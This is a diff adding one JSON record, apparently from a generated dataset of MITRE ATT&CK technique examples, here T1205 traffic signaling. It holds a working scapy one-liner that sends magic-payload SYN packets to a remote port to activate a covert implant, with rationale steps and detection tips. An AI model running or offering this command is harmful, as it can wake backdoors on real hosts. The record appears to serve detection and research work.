@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1205",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "sudo python3 -c \"from scapy.all import IP,TCP,Raw,send; send(IP(dst='203.0.113.50')/TCP(dport=4444,flags='S')/Raw(load=b'MAGICOPEN'), count=3, inter=0.2, verbose=0)\"",
+  "explanation": "Uses scapy to craft and transmit repeated TCP SYN packets with a magic payload that a covert listener can treat as an activation signal. Requires sudo for raw packet crafting. Detection: IDS rules for consistent magic strings in TCP payloads to low-visibility ports and alert on raw-socket usage.",
+  "rationale_steps": [
+    "Construct a TCP SYN with a specific payload marker (MAGICOPEN).",
+    "Send it multiple times at a controlled interval to port 4444.",
+    "Remote implant interprets the signal to open or activate a hidden function.",
+    "Defenders monitor for raw-socket activity and TCP payload signatures to uncommon ports."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1205-4e50b45e-55f9e54b",
+  "source_prompt_hash": "4e50b45e",
+  "timestamp_utc": "2025-09-30T05:51:10.007150Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
